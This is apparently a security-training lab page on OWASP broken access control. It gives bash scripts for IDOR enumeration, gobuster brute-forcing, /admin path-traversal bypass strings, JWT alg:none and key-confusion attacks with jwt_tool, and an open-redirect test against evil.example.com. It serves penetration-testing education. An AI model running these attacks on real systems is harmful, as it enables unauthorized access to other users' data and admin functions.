---
title: A01 — Broken Access Control
sidebar_position: 2
tags: [lab, owasp-a01, idor, jwt, path-traversal]
---

# A01 — Broken Access Control

## What this lab covers

- IDOR (Insecure Direct Object Reference) — accessing other users' data by changing IDs
- Path traversal bypasses — techniques to evade access control on admin paths
- JWT attacks — alg:none, RS256→HS256 confusion, jwt_tool scanning
- Open redirects — abusing redirect parameters for phishing

## Configuration

Edit these values before running:

```bash
TARGET="http://TARGET_IP_OR_DOMAIN"
PORT="80"
WORDLIST="/usr/share/wordlists/dirb/common.txt"
```

## Exercise 1: IDOR Testing

Loop through user IDs and check for unauthorized access to profile data:

```bash
for ID in $(seq 1 20); do
  RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/api/user/profile?id=$ID")
  echo "ID $ID: HTTP $RESPONSE"
done
```

Look for HTTP 200 responses on IDs that don't belong to the authenticated user. A properly secured endpoint should return 403 or 404 for unauthorized IDs.

## Exercise 2: Directory Discovery

Use gobuster to brute-force directories and files:

```bash
gobuster dir \
  -u "$TARGET" \
  -w "$WORDLIST" \
  -s "200,204,301,302,307,401,403" \
  -o gobuster_results.txt
```

Review results for sensitive paths (admin panels, config files, backup files).

## Exercise 3: Path Traversal Bypasses

Access controls on `/admin` are commonly bypassed using encoding tricks. Test these 8 bypass variants:

```bash
BYPASSES=(
  "/..;/admin"
  "/%2e%2e;/admin"
  "/admin%20"
  "/admin%09"
  "/admin."
  "/ADMIN"
  "/admin/"
  "/admin/."
)

for BYPASS in "${BYPASSES[@]}"; do
  RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET$BYPASS")
  echo "Bypass '$BYPASS': HTTP $RESPONSE"
done
```

Any 200 response on a bypass variant that returns 403 on `/admin` directly is a finding.

## Exercise 4: JWT Attacks

### Base64 decode JWT parts

```bash
JWT="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.signature"
HEADER=$(echo $JWT | cut -d'.' -f1 | base64 -d 2>/dev/null)
PAYLOAD=$(echo $JWT | cut -d'.' -f2 | base64 -d 2>/dev/null)
echo "Header: $HEADER"
echo "Payload: $PAYLOAD"
```

### alg:none attack

Force the server to accept an unsigned token:

```bash
python3 /opt/jwt_tool/jwt_tool.py "$JWT" -X a
```

### RS256 to HS256 confusion

If the server uses RS256 but also accepts HS256, sign the token with the public key as the HMAC secret:

```bash
python3 /opt/jwt_tool/jwt_tool.py "$JWT" -X k -pk public_key.pem
```

### jwt_tool vulnerability scan

Run all checks against a target endpoint:

```bash
python3 /opt/jwt_tool/jwt_tool.py "$JWT" -t "$TARGET/api/protected" -rh "Authorization: Bearer $JWT" -M pb
```

## Exercise 5: Open Redirect

Test 12 common redirect parameters for unvalidated redirects:

```bash
REDIRECT_PARAMS=(
  "redirect"
  "url"
  "next"
  "return"
  "returnUrl"
  "redir"
  "goto"
  "target"
  "dest"
  "destination"
  "continue"
  "forward"
)

EVIL_URL="https://evil.example.com"

for PARAM in "${REDIRECT_PARAMS[@]}"; do
  RESPONSE=$(curl -s -o /dev/null -w "%{redirect_url}" "$TARGET/login?$PARAM=$EVIL_URL")
  if echo "$RESPONSE" | grep -q "evil.example.com"; then
    echo "[VULNERABLE] Parameter '$PARAM' redirects to: $RESPONSE"
  else
    echo "[ safe ] Parameter '$PARAM'"
  fi
done
```

An open redirect is confirmed when the final redirect destination matches the attacker-controlled URL.
